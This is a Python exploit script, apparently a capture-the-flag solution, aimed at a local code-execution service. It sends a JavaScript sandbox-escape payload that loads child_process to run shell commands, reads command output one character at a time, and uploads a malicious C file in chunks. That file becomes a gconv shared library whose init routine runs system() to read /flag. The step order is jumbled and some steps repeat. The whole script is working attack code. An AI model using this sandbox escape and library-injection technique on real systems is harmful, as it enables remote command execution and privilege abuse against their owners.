import requests
import time
import base64

URL = "http://127.0.0.1:59995"
SID = "a8fc75f9ed2425fa585d82e221b79bd8"

def run_cmd(cmd):
    payload = f'new Proxy({{}},{{get(){{return function(a){{b=Reflect.ownKeys(a.__proto__)[4];c=a[b](decodeURI("return %70rocess"))();return a(c.mainModule[b]._load(decodeURI("child_%70rocess")).execSync("{cmd}"))}}}}}})'
    
    try:
        r = requests.post(f"{URL}/api/run",
                          headers={"X-Session-Id": SID, "Content-Type": "application/json"},
                          json={"code": payload},
                          timeout=10)
        if r.status_code != 204:
            return None
    except:
        return None
    
    result = ""
    cursor = 0
    while True:
        try:
            r = requests.get(f"{URL}/api/run",
                             headers={"X-Session-Id": SID},
                             params={"cursor": cursor},
                             timeout=10)
            if r.status_code != 200:
                break
            char = r.json().get("char", "")
            if not char:
                break
            result += char
            cursor += 1
        except:
            break
    return result

print("=" * 60)
print("Writing evil.c properly")
print("=" * 60)

# 清空并重写 evil.c
evil_c = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

void gconv_init(void) {
    system("chmod 777 /flag");
    system("cp /flag /tmp/flag.txt");
}

void gconv(void) {}
'''

c_b64 = base64.b64encode(evil_c.encode()).decode()
total = len(c_b64)
print(f"Base64 length: {total}")

print("\n" + "=" * 60)
print("STEP 3: Uploading base64")
print("=" * 60)

chunk_size = 30          # 每块 30 字符
requests_per_batch = 300 # 每批 300 次请求
batch_size = chunk_size * requests_per_batch  # 9000 字符
wait_time = 30           # 每批休息 30 秒

total_batches = (total + batch_size - 1) // batch_size

print(f"    Total base64: {total} chars")
print(f"    Chunk size: {chunk_size} chars")
print(f"    Requests per batch: {requests_per_batch}")
print(f"    Batch size: {batch_size} chars")
print(f"    Total batches: {total_batches}")
print(f"    Wait per batch: {wait_time} seconds")
print(f"    Estimated time: {total_batches * wait_time // 60} minutes")

for batch_num in range(total_batches):
    batch_start = batch_num * batch_size
    batch_end = min(batch_start + batch_size, total)
    batch = c_b64[batch_start:batch_end]
    
    print(f"\n    Batch {batch_num + 1}/{total_batches}")
    print(f"    Chars {batch_start}-{batch_end} ({len(batch)} chars)")
    
    # 分块写入
    for i in range(0, len(batch), chunk_size):
        chunk = batch[i:i+chunk_size]
        if batch_num == 0 and i == 0:
            run_cmd(f"echo -n '{chunk}' > /tmp/evil.b64")
        else:
            run_cmd(f"echo -n '{chunk}' >> /tmp/evil.b64")
    
    print(f"        Batch {batch_num + 1} complete")
    
    if batch_num < total_batches - 1:
        print(f"        Waiting {wait_time} seconds...")
        time.sleep(wait_time)

print("\n" + "=" * 60)
print("STEP 4: Verifying upload")
print("=" * 60)

result = run_cmd("wc -c < /tmp/evil.b64 2>/dev/null")
print(f"    Uploaded: {result} bytes")
print(f"    Expected: {total} bytes")

if result and int(result) == total:
    print("    [SUCCESS] Upload complete!")
    run_cmd("base64 -d /tmp/evil.b64 > /tmp/evil.c")
else:
    print("    [FAILED] Upload incomplete!")
    exit(1)

print("\n" + "=" * 60)
print("STEP 5: Verifying evil.c")
print("=" * 60)
print(run_cmd("cat /tmp/evil.c"))

c_b64 = base64.b64encode(evil_c.encode()).decode()
run_cmd("rm -f /tmp/evil.c /tmp/evil.so /tmp/flag.txt")
run_cmd(f"echo '{c_b64}' | base64 -d > /tmp/evil.c")
print("evil.c created")

print("\n" + "=" * 60)
print("Step 2: Compiling evil.so")
print("=" * 60)
run_cmd("gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c 2>&1")
result = run_cmd("ls -la /tmp/evil.so")
print(f"Compilation result: {result}")

